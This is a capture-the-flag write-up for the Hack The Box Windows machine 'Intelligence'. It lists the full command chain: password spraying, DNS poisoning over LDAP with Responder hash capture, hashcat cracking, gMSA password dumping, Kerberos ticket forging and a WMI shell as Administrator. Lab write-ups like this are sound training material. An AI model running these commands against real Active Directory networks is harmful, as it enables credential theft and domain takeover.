## 📌 Box Info
- **OS**: [Windows](Windows)
- **Difficulty**: [Medium](Medium)
- Platform: [HTB](HTB)
- Prep: [OSCP](OSCP)
- **Key Exploits:**  
  - PDF metadata & URL fuzzing → default creds  
  - Password spraying  
  - LDAP DNS record injection → Responder NTLM capture  
  - gMSA password dump (ReadGMSAPassword)  
  - Kerberos S4U2Self/S4U2Proxy (silver ticket)  
  - WMI exec  

---

## TL;DR 🚀
1. **Recon:** nmap → DC + DNS + HTTP + LDAP + SMB  
2. **PDF Hunt:** brute‑force `/documents/YYYY‑MM‑DD-upload.pdf` → find default password **NewIntelligenceCorpUser9876** in PDF text  
3. **User Enumeration:** extract `/Creator` metadata → list ~30 usernames → validate with kerbrute  
4. **Password Spray:** `crackmapexec smb` → **Tiffany.Molina:NewIntelligenceCorpUser9876** → SMB as Tiffany → grab `user.txt`  
5. **Find Script:** SMB share `IT\downdetector.ps1` polls **web*** DNS records every 5 min, using default creds  
6. **Poison DNS:** use `dnstool.py` (LDAP) to add `web-0xdf`→your IP → wait for HTTP callback → capture NTLMv2 with Responder  
7. **Crack Hash:** NTLMv2 of `Ted.Graves` → **Mr.Teddy** → SMB as Ted  
8. **BloodHound:** Ted.Graves ∈ ITSupport → has **ReadGMSAPassword** on `svc_int$` & `svc_int` has **AllowedToDelegate**→DC  
9. **gMSADumper:** dump `svc_int$` NTLM hash via LDAP  
10. **Silver Ticket:** `getST.py` S4U2Self+Proxy for SPN `www/dc.intelligence.htb` impersonating Administrator → `administrator.ccache`  
11. **Shell:**  
    ```bash
    KRB5CCNAME=administrator.ccache \
      wmiexec.py -k -no-pass administrator@dc.intelligence.htb
    ```  
12. **Root.txt** acquired from `C:\Users\Administrator\Desktop\root.txt`

---

## Important Commands 🛠️

```bash
# 1. Enumerate PDFs, extract Creator & default password
#    (See Python script in writeup)

# 2. Validate users & spray default password
kerbrute userenum --dc 10.10.10.248 -d intelligence.htb users.txt
crackmapexec smb 10.10.10.248 \
  -u users.txt -p NewIntelligenceCorpUser9876 \
  --continue-on-success

# 3. SMB as Tiffany.Molina
smbclient -U Tiffany.Molina //10.10.10.248/Users

# 4. Fetch downdetector.ps1
smbclient -U Tiffany.Molina //10.10.10.248/IT
get downdetector.ps1

# 5. Poison DNS via LDAP
dnstool.py -u intelligence\\Tiffany.Molina \
  -p NewIntelligenceCorpUser9876 \
  --action add --record web-0xdf \
  --data 10.10.14.19 --type A intelligence.htb

# 6. Capture NTLMv2 with Responder
sudo responder -I tun0

# 7. Crack Ted.Graves’s hash
hashcat -m 5600 ted.graves.hash /usr/share/wordlists/rockyou.txt

# 8. Dump GMSA password as Ted.Graves
gMSADumper.py -u Ted.Graves -p Mr.Teddy \
  -l intelligence.htb -d intelligence.htb

# 9. Forge silver ticket (S4U2Self + Proxy)
getST.py -dc-ip 10.10.10.248 \
  -spn www/dc.intelligence.htb \
  -hashes :<svc_int$hash> \
  -impersonate administrator \
  intelligence.htb/svc_int

# 10. WMI exec as administrator
KRB5CCNAME=administrator.ccache \
  wmiexec.py -k -no-pass administrator@dc.intelligence.htb
```

---

## Key Takeaways 🔑
- **Hidden PDF end‑points** can leak default creds via Exif & text extraction.  
- **LDAP DNS injection** (AD‐Integrated records) + Responder → NTLMv2 capture.  
- **gMSA** (ReadGMSAPassword) + **Constrained Delegation** → silver ticket forging.  
- **Impacket tools** (`getST.py`, `wmiexec.py`) streamline Kerberos abuse.  

---

## References 📚
- **dnstool.py** (LDAP DNS editor)  
- **Responder** – LLMNR/mDNS/NetBIOS poisoner  
- **gMSADumper** – dump group‐managed service account creds  
- **Impacket** – getST.py & wmiexec.py for Kerberos & WMI  
- **BloodHound** – graph AD ACLs & delegation paths  